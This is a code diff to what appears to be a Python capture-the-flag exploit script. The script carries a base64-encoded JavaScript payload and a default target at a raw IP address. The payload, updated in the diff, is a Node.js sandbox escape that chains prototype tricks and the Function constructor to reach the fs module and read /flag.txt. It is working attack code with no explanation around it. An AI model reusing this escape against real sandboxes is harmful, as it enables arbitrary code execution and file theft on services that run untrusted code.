@@ -33,13 +33,13 @@ import urllib.error
 import urllib.request as U
 import uuid
 
-# payload.js (266 bytes) 를 base64 로 내장 — 파일이 깨지거나 없어도 동작.
+# payload.js (264 bytes) 를 base64 로 내장 — 파일이 깨지거나 없어도 동작.
 EMBEDDED_B64 = (
     "Yz1CdWZmZXIuY2FsbDtDPWMuYmluZChjKTtwPSJfX3Byb3RvX18iO1c9V2ViQXNzZW1ibHku"
     "Y29tcGlsZVN0cmVhbWluZztXKCkuY2F0Y2goZT0+e0MoQyhjLl9fbG9va3VwU2V0dGVyX18s"
     "YyxwKSxDKEMoYy5fX2xvb2t1cEdldHRlcl9fLGMscCksZSksbnVsbCk7VygpLmNhdGNoKGU9"
-    "PmUudG9TdHJpbmcuY29uc3RydWN0b3JgY29uc29sZS5sb2cocHJvY2Vzcy5tYWluTW9kdWxl"
-    "LnJlcXVpcmUoJ2ZzJykucmVhZEZpbGVTeW5jKCcvZmxhZy50eHQnKSsnJylgKCkpfSk="
+    "PmUudG9TdHJpbmcuY29uc3RydWN0b3JgY29uc29sZS5sb2cocHJvY2Vzcy5nZXRCdWlsdGlu"
+    "TW9kdWxlKCdmcycpLnJlYWRGaWxlU3luYygnL2ZsYWcudHh0JykrJycpYCgpKX0p"
 )
 
 DEFAULT_BASE = "http://204.48.30.25:9000"
